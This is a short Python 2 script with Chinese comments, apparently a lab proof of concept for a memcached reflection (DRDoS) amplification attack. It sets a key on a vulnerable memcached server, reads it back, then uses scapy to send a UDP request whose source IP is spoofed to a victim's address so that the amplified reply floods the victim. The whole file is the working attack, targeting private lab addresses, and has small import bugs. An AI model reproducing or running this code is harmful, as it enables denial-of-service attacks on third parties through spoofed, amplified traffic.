#!/usr/bin/python
#coding:utf-8

import socket,struct,time,scapy

#定义memcached的set命令
def mem_set(vuln_host,port):

    #建立socket对象
    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    socket.setdefaulttimeout(10)  #python设置socket的超时时间为10秒

    #连接目标端
    client.connect_ex((vuln_host,port))

    #memcached设置set值
    send_data="set ab 0 0 10\r\nabc\r\n\r\n\r\n\r\n\r\n"
    client.send(send_data)
    recv_data=client.recv(2048)
    print recv_data
    #print '已经在存在漏洞的主机上设置好了key'
    #client.close()

#定义memcached的get命令
def mem_get(vuln_host,port):
    
    #建立socket对象
    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    socket.setdefaulttimeout(10)

    #连接目标端
    client.connect_ex((vuln_host,port))

    #memcached设置set值
    send_data="get ab\r\n\r\n\r\n\r\n\r\n"
    client.send(send_data)
    recv_data=client.recv(8192)
    #print '从存在漏洞的主机上读取key值'
    print recv_data
    #client.close()

#攻击程序
def attack(vuln_host,drdos_host,port):
    send_data="\x00\x00\x00\x00\x00\x01\x00\x00get ab\r\n\r\n\r\n\r\n\r\n"
    #下面这句话的意思是伪造受害者向存在memcached漏洞的服务器发起UDP请求，源端口是29284，目标端口是port
    packet=scapy.all.IP(dst=vuln_host,src=drdos_host) / scapy.all.UDP(sport=29284,dport=port) / send_data
    send(packet,inter=1,count=1)

#定义主函数
def main():
    vuln_host='192.168.25.129'
    drdos_host='192.168.25.1'
    port=11211
    
    mem_set(vuln_host,port)
    time.sleep(3)
    
    mem_get(vuln_host,port)
    time.sleep(3)
    
    attack(vuln_host,drdos_host,port)

main()
